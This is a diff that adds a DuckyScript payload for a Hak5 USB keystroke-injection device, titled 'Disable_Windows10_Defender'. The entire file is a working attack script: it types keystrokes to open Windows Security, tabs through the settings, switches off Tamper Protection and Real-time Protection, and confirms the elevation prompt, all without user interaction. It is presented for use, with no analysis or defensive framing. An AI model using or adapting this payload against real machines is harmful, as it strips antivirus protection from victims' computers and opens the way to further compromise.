@@ -1,0 +1,52 @@
+REM Title:         Disable_Windows10_Defender
+REM Description    Disable Windows Defender and Tamper protection on Windows 10
+REM Author:        Zero_Sploit
+REM Props:         Hak5 Team
+REM Version:       1.0
+REM Target:        Windows 10
+REM Attackmodes:   HID
+DELAY 1000
+REM Open Windows Defender Settings
+CTRL ESC
+DELAY 1000
+STRING windows security
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+REM Navigate to Manage Settings then turn off Tamper Protection && Realtime Protection
+DOWN
+DOWN
+DOWN
+DOWN
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+DELAY 500
+SHIFT SPACE
+DELAY 1000
+ALT y
+DELAY 500
+ALT F4
+DELAY 1000
+CTRL ESC
+DELAY 1000
+STRING windows security
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DOWN
+DOWN
+DOWN
+DOWN
+ENTER
+DELAY 500
+SHIFT SPACE
+DELAY 500
+ALT y
+DELAY 500
+ALT F4
